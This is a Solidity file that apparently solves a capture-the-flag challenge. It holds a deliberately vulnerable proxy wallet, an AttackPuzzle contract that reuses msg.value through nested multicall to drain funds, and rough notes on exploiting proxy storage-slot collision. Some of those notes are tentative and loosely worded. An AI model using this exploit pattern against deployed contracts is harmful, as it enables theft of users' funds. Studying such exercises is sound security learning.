// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "../helpers/UpgradeableProxy-08.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(
        address _admin,
        address _implementation,
        bytes memory _initData
    ) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(
            pendingAdmin == _expectedAdmin,
            "Expected new admin by the current admin is not the pending admin"
        );
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

interface Iwallet {
    function proposeNewAdmin(address _newAdmin) external;

    function setMaxBalance(uint256 _maxBalance) external;

    function addToWhitelist(address addr) external;

    function deposit() external payable;

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable;

    function multicall(bytes[] calldata data) external payable;
}

contract AttackPuzzle {
    Iwallet public wallet;

    constructor(address _wallet) payable {
        wallet = Iwallet(_wallet);
    }

    function owned() public {
        bytes[] memory args = new bytes[](1);
        args[0] = abi.encodeWithSelector(wallet.deposit.selector);

        bytes[] memory data = new bytes[](2);
        data[0] = args[0];
        data[1] = abi.encodeWithSelector(wallet.multicall.selector, args);
        wallet.multicall{value: 0.001 ether}(data);
        wallet.execute(msg.sender, 0.002 ether, "");
    }
    //web3.eth.abi.decodeParameter('uint256', "0x000000000000000000000000ea8377b53884c5178782ab253b7d2375176f7e3c" )
    //"1338835666022046400909469669843937841612825001532"
    //web3.eth.abi.encodeParameter('address', '0xea8377B53884C5178782Ab253B7d2375176F7e3C')
    //"0x000000000000000000000000ea8377b53884c5178782ab253b7d2375176f7e3c"
}

/*web3.eth.getStorageAt()
 **web3.eth.abi.encodeParameter('address', '0xea8377B53884C5178782Ab253B7d2375176F7e3C')
 **owner is at index 0, maybe this is an error but it seems that owner is also at index 1.
 **if I delegate call proposeNewAdmin on the implementation , I might be able to change the owner.
 **
 **------------------
 ** maybe there is collision to be considered as well
 **------------------
 ** turns out the wallet address is the same as the proxy address
 **So what needs to be done instead is to first call propose newAdmin and then become the the owner of the wallet,
 **change the maxBalance and also find a way to do a reentrancy attack on the multicall.
 **
 */
